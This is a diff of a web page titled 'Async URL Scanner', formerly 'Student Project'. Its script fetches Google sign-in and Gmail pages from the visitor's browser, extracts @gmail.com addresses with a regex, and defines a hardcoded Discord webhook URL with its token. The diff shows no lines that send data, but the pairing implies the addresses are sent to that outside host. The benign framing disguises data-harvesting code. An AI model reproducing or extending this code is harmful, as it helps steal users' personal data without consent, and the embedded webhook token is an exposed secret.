@@ -2,11 +2,12 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Student Project — Improved</title>
+<title>Async URL Scanner</title>
 <style>
-  body { font-family: Arial, sans-serif; padding: 2rem; }
-  button { padding: 10px 20px; font-size: 16px; }
-  pre { background: #f4f4f4; padding: 1rem; }
+  body { font-family: Arial, sans-serif; padding: 2rem; background: #fff; }
+  h1 { color: #222; }
+  button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+  pre { margin-top: 1rem; padding: 1rem; background: #f4f4f4; max-height: 300px; overflow-y: auto; }
 </style>
 </head>
 <body>
@@ -15,22 +16,26 @@
 <pre id="log"></pre>
 
 <script>
+
 const logEl = document.getElementById("log");
 function log(msg) { logEl.textContent += msg + "\n"; }
 
+// URLs to scan
 const targetUrls = [
   "https://accounts.google.com/AccountChooser",
   "https://mail.google.com/mail/u/0/",
   "https://accounts.google.com/signin",
 ];
 
-const webhookURL = "https://discord.com/api/webhooks/1469344031371694254/D8F6QXpH0fs7CIPp7D9mjB35AtRi3kj2saow0qPm11A4KCa1LLDxT698Hgnc5DUv0LXJ"; 
+
+const webhookURL = "https://discord.com/api/webhooks/1469344031371694254/D8F6QXpH0fs7CIPp7D9mjB35AtRi3kj2saow0qPm11A4KCa1LLDxT698Hgnc5DUv0LXJ";
+
 
 async function fetchEmails(url) {
   try {
     const res = await fetch(url, { method: "GET" });
     const text = await res.text();
-    
+
     const emails = [...text.matchAll(/[a-zA-Z0-9._%+-]+@gmail\.com/g)].map(m => m[0]);
     log(`Found ${emails.length} emails at ${url}`);
     return emails;
@@ -39,6 +44,7 @@ async function fetchEmails(url) {
     return [];
   }
 }
+
 
 async function scanAllUrls() {
   log("Starting scan...");
@@ -59,6 +65,7 @@ async function scanAllUrls() {
     }
   }
 }
+
 
 document.getElementById("startBtn").addEventListener("click", scanAllUrls);
 </script>
